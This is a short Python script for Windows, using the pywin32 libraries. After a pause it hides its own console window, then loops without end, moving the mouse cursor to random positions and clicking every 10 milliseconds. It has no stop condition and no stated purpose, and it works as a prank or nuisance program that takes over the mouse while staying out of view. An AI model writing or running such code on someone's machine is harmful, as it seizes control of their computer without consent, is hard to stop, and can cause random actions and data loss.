import win32api
import win32console
import win32gui
import win32con
import random
import time
import os

width=win32api.GetSystemMetrics(0)
height=win32api.GetSystemMetrics(1)

os.system("pause")
ct=win32api.GetConsoleTitle()
hd=win32gui.FindWindow(0,ct)
win32gui.ShowWindow(hd,0)



while True:
    x=random.randint(0,width)
    y=random.randint(0,height)
    print (x,y)
    time.sleep(0.01)
    win32api.SetCursorPos((x,y))
    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN|win32con.MOUSEEVENTF_LEFTUP, 0, 0)
